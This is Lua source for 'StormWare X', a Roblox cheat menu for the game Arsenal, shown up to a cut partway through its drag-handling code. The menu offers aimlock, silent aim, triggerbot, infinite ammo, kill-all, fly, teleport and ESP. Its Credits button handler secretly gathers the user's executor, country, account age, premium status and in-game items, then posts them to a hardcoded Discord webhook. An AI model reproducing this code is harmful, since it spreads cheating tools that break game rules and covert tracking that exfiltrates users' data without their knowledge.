-- Gui to Lua
-- Version: 3.2

-- Instances:

local StormWareX = Instance.new("ScreenGui")
local ware = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Title = Instance.new("TextLabel")
local HomeFrame = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local CombatFrame = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local aimlock = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local Hitboxes = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local FireRate = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local triggerbot = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local InfAmmo = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local lowertorso = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local random = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local Smoothlock = Instance.new("TextButton")
local UICorner_11 = Instance.new("UICorner")
local killall = Instance.new("TextButton")
local UICorner_12 = Instance.new("UICorner")
local Free = Instance.new("TextButton")
local UICorner_13 = Instance.new("UICorner")
local Home = Instance.new("TextButton")
local UICorner_14 = Instance.new("UICorner")
local Combat = Instance.new("TextButton")
local UICorner_15 = Instance.new("UICorner")
local Player = Instance.new("TextButton")
local UICorner_16 = Instance.new("UICorner")
local PlayerFrame = Instance.new("Frame")
local UICorner_17 = Instance.new("UICorner")
local TextLabel_3 = Instance.new("TextLabel")
local Gravity = Instance.new("TextBox")
local UICorner_18 = Instance.new("UICorner")
local upd = Instance.new("TextButton")
local UICorner_19 = Instance.new("UICorner")
local Nonexisty = Instance.new("TextButton")
local UICorner_20 = Instance.new("UICorner")
local teleport = Instance.new("TextBox")
local UICorner_21 = Instance.new("UICorner")
local tel = Instance.new("TextButton")
local UICorner_22 = Instance.new("UICorner")
local Walkspeed = Instance.new("TextButton")
local UICorner_23 = Instance.new("UICorner")
local Sunglasses = Instance.new("TextButton")
local UICorner_24 = Instance.new("UICorner")
local Fly = Instance.new("TextButton")
local UICorner_25 = Instance.new("UICorner")
local mobile = Instance.new("TextButton")
local UICorner_26 = Instance.new("UICorner")
local console = Instance.new("TextButton")
local UICorner_27 = Instance.new("UICorner")
local none = Instance.new("TextButton")
local UICorner_28 = Instance.new("UICorner")
local pc = Instance.new("TextButton")
local UICorner_29 = Instance.new("UICorner")
local Visuals = Instance.new("TextButton")
local UICorner_30 = Instance.new("UICorner")
local VisualFrame = Instance.new("Frame")
local UICorner_31 = Instance.new("UICorner")
local TextLabel_4 = Instance.new("TextLabel")
local box = Instance.new("TextButton")
local UICorner_32 = Instance.new("UICorner")
local fov = Instance.new("TextBox")
local UICorner_33 = Instance.new("UICorner")
local updFov = Instance.new("TextButton")
local UICorner_34 = Instance.new("UICorner")
local CreditsFrame = Instance.new("Frame")
local UICorner_35 = Instance.new("UICorner")
local Title_2 = Instance.new("TextLabel")
local upperText = Instance.new("TextLabel")
local stormcr = Instance.new("TextLabel")
local lolcat_relative = Instance.new("TextLabel")
local Credits = Instance.new("TextButton")
local UICorner_36 = Instance.new("UICorner")

--Properties:

StormWareX.Name = "StormWare X"
StormWareX.Parent = game:WaitForChild("CoreGui")
StormWareX.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
StormWareX.DisplayOrder = 999

ware.Name = "ware"
ware.Parent = StormWareX
ware.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
ware.Position = UDim2.new(0.313939393, 0, 0.29753083, 0)
ware.Size = UDim2.new(0, 614, 0, 327)

UICorner.CornerRadius = UDim.new(0, 19)
UICorner.Parent = ware

Title.Name = "Title"
Title.Parent = ware
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.Position = UDim2.new(0.275244325, 0, 0, 0)
Title.Size = UDim2.new(0, 275, 0, 74)
Title.Font = Enum.Font.Sarpanch
Title.Text = "StormWare X"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.TextSize = 34.000
Title.TextWrapped = true

HomeFrame.Name = "HomeFrame"
HomeFrame.Parent = ware
HomeFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
HomeFrame.Position = UDim2.new(0.201954395, 0, 0.195718661, 0)
HomeFrame.Size = UDim2.new(0, 464, 0, 233)

UICorner_2.CornerRadius = UDim.new(0, 34)
UICorner_2.Parent = HomeFrame

TextLabel.Parent = HomeFrame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.0581896566, 0, 0.0429184549, 0)
TextLabel.Size = UDim2.new(0, 421, 0, 50)
TextLabel.Font = Enum.Font.Nunito
TextLabel.Text = "The Best Competitive Arsenal Exploit."
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

CombatFrame.Name = "CombatFrame"
CombatFrame.Parent = ware
CombatFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
CombatFrame.Position = UDim2.new(0.201954395, 0, 0.195718661, 0)
CombatFrame.Size = UDim2.new(0, 464, 0, 233)
CombatFrame.Visible = false

UICorner_3.CornerRadius = UDim.new(0, 34)
UICorner_3.Parent = CombatFrame

TextLabel_2.Parent = CombatFrame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.0452586226, 0, 0.0429184549, 0)
TextLabel_2.Size = UDim2.new(0, 421, 0, 50)
TextLabel_2.Font = Enum.Font.Nunito
TextLabel_2.Text = "Combat"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

aimlock.Name = "aimlock"
aimlock.Parent = CombatFrame
aimlock.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
aimlock.Position = UDim2.new(0.0452586263, 0, 0.257510722, 0)
aimlock.Size = UDim2.new(0, 84, 0, 40)
aimlock.Font = Enum.Font.Nunito
aimlock.Text = "Aimlock"
aimlock.TextColor3 = Color3.fromRGB(255, 255, 255)
aimlock.TextScaled = true
aimlock.TextSize = 14.000
aimlock.TextWrapped = true

UICorner_4.Parent = aimlock

Hitboxes.Name = "Hitboxes"
Hitboxes.Parent = CombatFrame
Hitboxes.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Hitboxes.Position = UDim2.new(0.269396544, 0, 0.257510722, 0)
Hitboxes.Size = UDim2.new(0, 84, 0, 40)
Hitboxes.Font = Enum.Font.Nunito
Hitboxes.Text = "Silent Aim (Head)"
Hitboxes.TextColor3 = Color3.fromRGB(255, 255, 255)
Hitboxes.TextScaled = true
Hitboxes.TextSize = 14.000
Hitboxes.TextWrapped = true

UICorner_5.Parent = Hitboxes

FireRate.Name = "FireRate"
FireRate.Parent = CombatFrame
FireRate.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
FireRate.Position = UDim2.new(0.493534476, 0, 0.257510722, 0)
FireRate.Size = UDim2.new(0, 84, 0, 40)
FireRate.Font = Enum.Font.Nunito
FireRate.Text = "Fire Rate"
FireRate.TextColor3 = Color3.fromRGB(255, 255, 255)
FireRate.TextScaled = true
FireRate.TextSize = 14.000
FireRate.TextWrapped = true

UICorner_6.Parent = FireRate

triggerbot.Name = "triggerbot"
triggerbot.Parent = CombatFrame
triggerbot.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
triggerbot.Position = UDim2.new(0.713362098, 0, 0.257510722, 0)
triggerbot.Size = UDim2.new(0, 84, 0, 40)
triggerbot.Font = Enum.Font.Nunito
triggerbot.Text = "Triggerbot"
triggerbot.TextColor3 = Color3.fromRGB(255, 255, 255)
triggerbot.TextScaled = true
triggerbot.TextSize = 14.000
triggerbot.TextWrapped = true

UICorner_7.Parent = triggerbot

InfAmmo.Name = "InfAmmo"
InfAmmo.Parent = CombatFrame
InfAmmo.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
InfAmmo.Position = UDim2.new(0.0452586114, 0, 0.476394832, 0)
InfAmmo.Size = UDim2.new(0, 84, 0, 40)
InfAmmo.Font = Enum.Font.Nunito
InfAmmo.Text = "Infinite Ammo"
InfAmmo.TextColor3 = Color3.fromRGB(255, 255, 255)
InfAmmo.TextScaled = true
InfAmmo.TextSize = 14.000
InfAmmo.TextWrapped = true

UICorner_8.Parent = InfAmmo

lowertorso.Name = "lowertorso"
lowertorso.Parent = CombatFrame
lowertorso.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
lowertorso.Position = UDim2.new(0.269396544, 0, 0.476394862, 0)
lowertorso.Size = UDim2.new(0, 84, 0, 40)
lowertorso.Font = Enum.Font.Nunito
lowertorso.Text = "Silent Aim (torso)"
lowertorso.TextColor3 = Color3.fromRGB(255, 255, 255)
lowertorso.TextScaled = true
lowertorso.TextSize = 14.000
lowertorso.TextWrapped = true

UICorner_9.Parent = lowertorso

random.Name = "random"
random.Parent = CombatFrame
random.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
random.Position = UDim2.new(0.478448272, 0, 0.476394862, 0)
random.Size = UDim2.new(0, 84, 0, 40)
random.Font = Enum.Font.Nunito
random.Text = "Silent Aim (Random)"
random.TextColor3 = Color3.fromRGB(255, 255, 255)
random.TextScaled = true
random.TextSize = 14.000
random.TextWrapped = true

UICorner_10.Parent = random

Smoothlock.Name = "Smoothlock"
Smoothlock.Parent = CombatFrame
Smoothlock.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Smoothlock.Position = UDim2.new(0.713362098, 0, 0.476394862, 0)
Smoothlock.Size = UDim2.new(0, 84, 0, 40)
Smoothlock.Font = Enum.Font.Nunito
Smoothlock.Text = "Smoothlock (press c to toggle)"
Smoothlock.TextColor3 = Color3.fromRGB(255, 255, 255)
Smoothlock.TextScaled = true
Smoothlock.TextSize = 14.000
Smoothlock.TextWrapped = true

UICorner_11.Parent = Smoothlock

killall.Name = "killall"
killall.Parent = CombatFrame
killall.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
killall.Position = UDim2.new(0.0452586412, 0, 0.682403445, 0)
killall.Size = UDim2.new(0, 84, 0, 40)
killall.Font = Enum.Font.Nunito
killall.Text = "Kill All (use knife) (synapse)"
killall.TextColor3 = Color3.fromRGB(255, 255, 255)
killall.TextScaled = true
killall.TextSize = 14.000
killall.TextWrapped = true

UICorner_12.Parent = killall

Free.Name = "Free"
Free.Parent = CombatFrame
Free.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Free.Position = UDim2.new(0.269396573, 0, 0.682403445, 0)
Free.Size = UDim2.new(0, 84, 0, 40)
Free.Font = Enum.Font.Nunito
Free.Text = "Kill All (Use knife)"
Free.TextColor3 = Color3.fromRGB(255, 255, 255)
Free.TextScaled = true
Free.TextSize = 14.000
Free.TextWrapped = true

UICorner_13.Parent = Free

Home.Name = "Home"
Home.Parent = ware
Home.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Home.BackgroundTransparency = 0.500
Home.Position = UDim2.new(0.0146579817, 0, 0.226299703, 0)
Home.Size = UDim2.new(0, 101, 0, 50)
Home.Font = Enum.Font.Nunito
Home.Text = "Home"
Home.TextColor3 = Color3.fromRGB(255, 255, 255)
Home.TextSize = 22.000

UICorner_14.CornerRadius = UDim.new(0, 12)
UICorner_14.Parent = Home

Combat.Name = "Combat"
Combat.Parent = ware
Combat.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Combat.BackgroundTransparency = 0.500
Combat.Position = UDim2.new(0.0146579817, 0, 0.403669715, 0)
Combat.Size = UDim2.new(0, 101, 0, 50)
Combat.Font = Enum.Font.Nunito
Combat.Text = "Combat"
Combat.TextColor3 = Color3.fromRGB(255, 255, 255)
Combat.TextSize = 22.000

UICorner_15.CornerRadius = UDim.new(0, 12)
UICorner_15.Parent = Combat

Player.Name = "Player"
Player.Parent = ware
Player.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Player.BackgroundTransparency = 0.500
Player.Position = UDim2.new(0.0146579817, 0, 0.577981651, 0)
Player.Size = UDim2.new(0, 101, 0, 50)
Player.Font = Enum.Font.Nunito
Player.Text = "Player/FE"
Player.TextColor3 = Color3.fromRGB(255, 255, 255)
Player.TextSize = 22.000

UICorner_16.CornerRadius = UDim.new(0, 12)
UICorner_16.Parent = Player

PlayerFrame.Name = "PlayerFrame"
PlayerFrame.Parent = ware
PlayerFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
PlayerFrame.Position = UDim2.new(0.201954395, 0, 0.195718661, 0)
PlayerFrame.Size = UDim2.new(0, 464, 0, 233)
PlayerFrame.Visible = false

UICorner_17.CornerRadius = UDim.new(0, 34)
UICorner_17.Parent = PlayerFrame

TextLabel_3.Parent = PlayerFrame
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(0.0452586226, 0, 0.0429184549, 0)
TextLabel_3.Size = UDim2.new(0, 421, 0, 50)
TextLabel_3.Font = Enum.Font.Nunito
TextLabel_3.Text = "LocalPlayer/FE"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14.000
TextLabel_3.TextWrapped = true

Gravity.Name = "Gravity"
Gravity.Parent = PlayerFrame
Gravity.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Gravity.Position = UDim2.new(0.0301724132, 0, 0.2918455, 0)
Gravity.Size = UDim2.new(0, 122, 0, 29)
Gravity.Font = Enum.Font.SourceSans
Gravity.PlaceholderText = "Gravity"
Gravity.Text = ""
Gravity.TextColor3 = Color3.fromRGB(255, 255, 255)
Gravity.TextScaled = true
Gravity.TextSize = 24.000
Gravity.TextWrapped = true

UICorner_18.Parent = Gravity

upd.Name = "upd"
upd.Parent = PlayerFrame
upd.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
upd.Position = UDim2.new(0.0646551698, 0, 0.442060083, 0)
upd.Size = UDim2.new(0, 89, 0, 22)
upd.Font = Enum.Font.Nunito
upd.Text = "Update"
upd.TextColor3 = Color3.fromRGB(255, 255, 255)
upd.TextScaled = true
upd.TextSize = 14.000
upd.TextWrapped = true

UICorner_19.Parent = upd

Nonexisty.Name = "Nonexisty"
Nonexisty.Parent = PlayerFrame
Nonexisty.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Nonexisty.Position = UDim2.new(0.366379321, 0, 0.442060083, 0)
Nonexisty.Size = UDim2.new(0, 99, 0, 30)
Nonexisty.Font = Enum.Font.Nunito
Nonexisty.Text = "Turn Invisible"
Nonexisty.TextColor3 = Color3.fromRGB(255, 255, 255)
Nonexisty.TextScaled = true
Nonexisty.TextSize = 14.000
Nonexisty.TextWrapped = true

UICorner_20.Parent = Nonexisty

teleport.Name = "teleport"
teleport.Parent = PlayerFrame
teleport.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
teleport.Position = UDim2.new(0.232758626, 0, 0.751072943, 0)
teleport.Size = UDim2.new(0, 178, 0, 31)
teleport.Font = Enum.Font.SourceSans
teleport.PlaceholderText = "Teleport To:"
teleport.Text = ""
teleport.TextColor3 = Color3.fromRGB(255, 255, 255)
teleport.TextScaled = true
teleport.TextSize = 14.000
teleport.TextWrapped = true

UICorner_21.Parent = teleport

tel.Name = "tel"
tel.Parent = PlayerFrame
tel.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
tel.Position = UDim2.new(0.334051728, 0, 0.914163232, 0)
tel.Size = UDim2.new(0, 84, 0, 20)
tel.Font = Enum.Font.Nunito
tel.Text = "Teleport"
tel.TextColor3 = Color3.fromRGB(255, 255, 255)
tel.TextScaled = true
tel.TextSize = 14.000
tel.TextWrapped = true

UICorner_22.Parent = tel

Walkspeed.Name = "Walkspeed"
Walkspeed.Parent = PlayerFrame
Walkspeed.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Walkspeed.Position = UDim2.new(0.657327592, 0, 0.442060083, 0)
Walkspeed.Size = UDim2.new(0, 106, 0, 30)
Walkspeed.Font = Enum.Font.Nunito
Walkspeed.Text = "Walkspeed"
Walkspeed.TextColor3 = Color3.fromRGB(255, 255, 255)
Walkspeed.TextScaled = true
Walkspeed.TextSize = 14.000
Walkspeed.TextWrapped = true

UICorner_23.Parent = Walkspeed

Sunglasses.Name = "Sunglasses"
Sunglasses.Parent = PlayerFrame
Sunglasses.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Sunglasses.Position = UDim2.new(0.653017223, 0, 0.665236056, 0)
Sunglasses.Size = UDim2.new(0, 108, 0, 40)
Sunglasses.Font = Enum.Font.Nunito
Sunglasses.Text = "Sunglasses"
Sunglasses.TextColor3 = Color3.fromRGB(255, 255, 255)
Sunglasses.TextScaled = true
Sunglasses.TextSize = 14.000
Sunglasses.TextWrapped = true

UICorner_24.Parent = Sunglasses

Fly.Name = "Fly"
Fly.Parent = PlayerFrame
Fly.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Fly.Position = UDim2.new(0.0344827585, 0, 0.665236056, 0)
Fly.Size = UDim2.new(0, 92, 0, 28)
Fly.Font = Enum.Font.Nunito
Fly.Text = "Fly (T to toggle)"
Fly.TextColor3 = Color3.fromRGB(255, 255, 255)
Fly.TextScaled = true
Fly.TextSize = 14.000
Fly.TextWrapped = true

UICorner_25.Parent = Fly

mobile.Name = "mobile"
mobile.Parent = PlayerFrame
mobile.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
mobile.Position = UDim2.new(0.381465495, 0, 0.2918455, 0)
mobile.Size = UDim2.new(0, 92, 0, 28)
mobile.Font = Enum.Font.Nunito
mobile.Text = "Spoof Device To Mobile"
mobile.TextColor3 = Color3.fromRGB(255, 255, 255)
mobile.TextScaled = true
mobile.TextSize = 14.000
mobile.TextWrapped = true

UICorner_26.Parent = mobile

console.Name = "console"
console.Parent = PlayerFrame
console.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
console.Position = UDim2.new(0.616379261, 0, 0.2918455, 0)
console.Size = UDim2.new(0, 92, 0, 28)
console.Font = Enum.Font.Nunito
console.Text = "Spoof Device To Console"
console.TextColor3 = Color3.fromRGB(255, 255, 255)
console.TextScaled = true
console.TextSize = 14.000
console.TextWrapped = true

UICorner_27.Parent = console

none.Name = "none"
none.Parent = PlayerFrame
none.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
none.Position = UDim2.new(0.372844785, 0, 0.613733888, 0)
none.Size = UDim2.new(0, 92, 0, 28)
none.Font = Enum.Font.Nunito
none.Text = "Spoof Device To None"
none.TextColor3 = Color3.fromRGB(255, 255, 255)
none.TextScaled = true
none.TextSize = 14.000
none.TextWrapped = true

UICorner_28.Parent = none

pc.Name = "pc"
pc.Parent = PlayerFrame
pc.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
pc.Position = UDim2.new(0.657327533, 0, 0.879828334, 0)
pc.Size = UDim2.new(0, 92, 0, 28)
pc.Font = Enum.Font.Nunito
pc.Text = "Spoof Device To PC"
pc.TextColor3 = Color3.fromRGB(255, 255, 255)
pc.TextScaled = true
pc.TextSize = 14.000
pc.TextWrapped = true

UICorner_29.Parent = pc

Visuals.Name = "Visuals"
Visuals.Parent = ware
Visuals.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Visuals.BackgroundTransparency = 0.500
Visuals.Position = UDim2.new(0.0146579817, 0, 0.755351663, 0)
Visuals.Size = UDim2.new(0, 101, 0, 50)
Visuals.Font = Enum.Font.Nunito
Visuals.Text = "Visuals"
Visuals.TextColor3 = Color3.fromRGB(255, 255, 255)
Visuals.TextSize = 22.000

UICorner_30.CornerRadius = UDim.new(0, 12)
UICorner_30.Parent = Visuals

VisualFrame.Name = "VisualFrame"
VisualFrame.Parent = ware
VisualFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
VisualFrame.Position = UDim2.new(0.201954395, 0, 0.195718661, 0)
VisualFrame.Size = UDim2.new(0, 464, 0, 233)
VisualFrame.Visible = false

UICorner_31.CornerRadius = UDim.new(0, 34)
UICorner_31.Parent = VisualFrame

TextLabel_4.Parent = VisualFrame
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.Position = UDim2.new(0.0452586226, 0, 0.0429184549, 0)
TextLabel_4.Size = UDim2.new(0, 421, 0, 50)
TextLabel_4.Font = Enum.Font.Nunito
TextLabel_4.Text = "Visuals"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 14.000
TextLabel_4.TextWrapped = true

box.Name = "box"
box.Parent = VisualFrame
box.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
box.Position = UDim2.new(0.407327592, 0, 0.257510722, 0)
box.Size = UDim2.new(0, 84, 0, 40)
box.Font = Enum.Font.Nunito
box.Text = "Box ESP"
box.TextColor3 = Color3.fromRGB(255, 255, 255)
box.TextScaled = true
box.TextSize = 14.000
box.TextWrapped = true

UICorner_32.Parent = box

fov.Name = "fov"
fov.Parent = VisualFrame
fov.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
fov.Position = UDim2.new(0.366379321, 0, 0.536480665, 0)
fov.Size = UDim2.new(0, 135, 0, 29)
fov.Font = Enum.Font.SourceSans
fov.PlaceholderText = "Arsenal FOV"
fov.Text = ""
fov.TextColor3 = Color3.fromRGB(255, 255, 255)
fov.TextScaled = true
fov.TextSize = 24.000
fov.TextWrapped = true

UICorner_33.Parent = fov

updFov.Name = "updFov"
updFov.Parent = VisualFrame
updFov.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
updFov.Position = UDim2.new(0.418103456, 0, 0.712446332, 0)
updFov.Size = UDim2.new(0, 84, 0, 40)
updFov.Font = Enum.Font.Nunito
updFov.Text = "Update"
updFov.TextColor3 = Color3.fromRGB(255, 255, 255)
updFov.TextScaled = true
updFov.TextSize = 14.000
updFov.TextWrapped = true

UICorner_34.Parent = updFov

CreditsFrame.Name = "CreditsFrame"
CreditsFrame.Parent = ware
CreditsFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
CreditsFrame.Position = UDim2.new(0.201954395, 0, 0.195718661, 0)
CreditsFrame.Size = UDim2.new(0, 464, 0, 233)
CreditsFrame.Visible = false

UICorner_35.CornerRadius = UDim.new(0, 34)
UICorner_35.Parent = CreditsFrame

Title_2.Name = "Title"
Title_2.Parent = CreditsFrame
Title_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title_2.BackgroundTransparency = 1.000
Title_2.Position = UDim2.new(0.0452586226, 0, 0.0429184549, 0)
Title_2.Size = UDim2.new(0, 421, 0, 50)
Title_2.Font = Enum.Font.Nunito
Title_2.Text = "Stormware Credits"
Title_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_2.TextScaled = true
Title_2.TextSize = 14.000
Title_2.TextWrapped = true

upperText.Name = "upperText"
upperText.Parent = CreditsFrame
upperText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
upperText.BackgroundTransparency = 1.000
upperText.Position = UDim2.new(0.25247106, 0, 0.392080426, 0)
upperText.Size = UDim2.new(0, 228, 0, 33)
upperText.Font = Enum.Font.SciFi
upperText.Text = "Stormware, the most best competitve arsenal exploit, Developed By"
upperText.TextColor3 = Color3.fromRGB(255, 255, 255)
upperText.TextSize = 16.000

stormcr.Name = "stormcr"
stormcr.Parent = CreditsFrame
stormcr.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
stormcr.BackgroundTransparency = 1.000
stormcr.Position = UDim2.new(0.25247106, 0, 0.533711314, 0)
stormcr.Size = UDim2.new(0, 228, 0, 33)
stormcr.Font = Enum.Font.SciFi
stormcr.Text = "Storm.#1020  - Core Development And Webhook"
stormcr.TextColor3 = Color3.fromRGB(255, 255, 255)
stormcr.TextSize = 16.000

lolcat_relative.Name = "lolcat_relative"
lolcat_relative.Parent = CreditsFrame
lolcat_relative.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
lolcat_relative.BackgroundTransparency = 1.000
lolcat_relative.Position = UDim2.new(0.317126215, 0, 0.641007423, 0)
lolcat_relative.Size = UDim2.new(0, 228, 0, 33)
lolcat_relative.Font = Enum.Font.SciFi
lolcat_relative.Text = "lolcat#1337  - Additional Webhook Infos (level, skin, melee)"
lolcat_relative.TextColor3 = Color3.fromRGB(255, 255, 255)
lolcat_relative.TextSize = 16.000

Credits.Name = "Credits"
Credits.Parent = ware
Credits.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Credits.BackgroundTransparency = 1.000
Credits.Position = UDim2.new(0.76710099, 0, 0.0183486305, 0)
Credits.Size = UDim2.new(0, 101, 0, 50)
Credits.Font = Enum.Font.Nunito
Credits.Text = "Credits"
Credits.TextColor3 = Color3.fromRGB(255, 255, 255)
Credits.TextSize = 22.000

UICorner_36.CornerRadius = UDim.new(0, 12)
UICorner_36.Parent = Credits

-- Scripts:

local function IHPN_fake_script() -- Home.LocalScript 
	local script = Instance.new('LocalScript', Home)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.CombatFrame.Visible = false
		script.Parent.Parent.PlayerFrame.Visible = false
		script.Parent.Parent.VisualFrame.Visible = false
		script.Parent.Parent.HomeFrame.Visible = true
		script.Parent.Parent.CreditsFrame.Visible = false
	end)
end
coroutine.wrap(IHPN_fake_script)()
local function JFYC_fake_script() -- Combat.LocalScript 
	local script = Instance.new('LocalScript', Combat)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.CombatFrame.Visible = true
		script.Parent.Parent.PlayerFrame.Visible = false
		script.Parent.Parent.VisualFrame.Visible = false
		script.Parent.Parent.HomeFrame.Visible = false
		script.Parent.Parent.CreditsFrame.Visible = false
	end)
end
coroutine.wrap(JFYC_fake_script)()
local function NAZZLY_fake_script() -- Player.LocalScript 
	local script = Instance.new('LocalScript', Player)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.CombatFrame.Visible = false
		script.Parent.Parent.PlayerFrame.Visible = true
		script.Parent.Parent.VisualFrame.Visible = false
		script.Parent.Parent.HomeFrame.Visible = false
		script.Parent.Parent.CreditsFrame.Visible = false
	end)
end
coroutine.wrap(NAZZLY_fake_script)()
local function ANWKS_fake_script() -- Visuals.LocalScript 
	local script = Instance.new('LocalScript', Visuals)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.CombatFrame.Visible = false
		script.Parent.Parent.PlayerFrame.Visible = false
		script.Parent.Parent.HomeFrame.Visible = false
		script.Parent.Parent.CreditsFrame.Visible = false
		script.Parent.Parent.VisualFrame.Visible = true
	end)
end
coroutine.wrap(ANWKS_fake_script)()
local function SGMI_fake_script() -- Credits.LocalScript 
	local script = Instance.new('LocalScript', Credits)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.CombatFrame.Visible = false
		script.Parent.Parent.PlayerFrame.Visible = false
		script.Parent.Parent.VisualFrame.Visible = false
		script.Parent.Parent.CreditsFrame.Visible = true
		script.Parent.Parent.HomeFrame.Visible = false
		
	
		local executor = "Unknown Exploit"
		pcall(function()
			executor = identifyexecutor()
		end)
		local pfp = "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png"
		pcall(function()
			pfp = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=420&height=420&format=png"
		end)
		local premium = "No"
		if game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium then
			premium = "Yes"
		end
		local url =
			"https://discord.com/api/webhooks/977962764200988693/8XY_YVlipxlBquz-uzi-PT-TbedKydGdK1DAMemTO_ieDeAU1jx-cKvY9FcBsDjI4FTd"
		local data = {
			["embeds"] = {
				{
					["color"] = 7498202,
					["fields"] = {
						{
							["name"] = "Executor",
							["value"] = executor,
							["inline"] = true
						},
						{
							["name"] = "Clock",
							["value"] = os.date("%I:%M %p"),
							["inline"] = true
						},
						{
							["name"] = "Flag",
							["value"] = ":flag_" .. game.LocalizationService:GetCountryRegionForPlayerAsync(game.Players.LocalPlayer):lower() .. ":",
							["inline"] = true
						},
						{
							["name"] = "Account Age",
							["value"] = game.Players.LocalPlayer.AccountAge .. " days",
							["inline"] = true
						},
						{
							["name"] = "Premium",
							["value"] = premium,
							["inline"] = true
						},
						{
							["name"] = "​",
							["value"] = "​"
						},
						{
							["name"] = "Level",
							["value"] = game.Players.LocalPlayer.CareerStatsCache.Level.Value,
							["inline"] = true
						},
						{
							["name"] = "Skin",
							["value"] = game.Players.LocalPlayer.Data.Skin.Value,
							["inline"] = true
						},
						{
							["name"] = "Melee",
							["value"] = game.Players.LocalPlayer.Data.Melee.Value,
							["inline"] = true
						}
					},
					["author"] = {
						["name"] = game.Players.LocalPlayer.Name .. " viewed The credits!",
						["icon_url"] = pfp
					}
				}
			}
		}
		local newdata = game:GetService("HttpService"):JSONEncode(data)
	
		local headers = {
			["content-type"] = "application/json"
		}
		request = http_request or request or HttpPost or syn.request
		local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
		request(abcdef)
	
	
	end)
end
coroutine.wrap(SGMI_fake_script)()
local function UKGTOE_fake_script() -- StormWareX.Core 
	local script = Instance.new('LocalScript', StormWareX)

	local UserInputService = game:GetService("UserInputService")
	local runService = (game:GetService("RunService"));
	
	local gui = script.Parent.ware
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	function Lerp(a, b, m)
		return a + (b - a) * m
	end;
	
	local lastMousePos
	local lastGoalPos
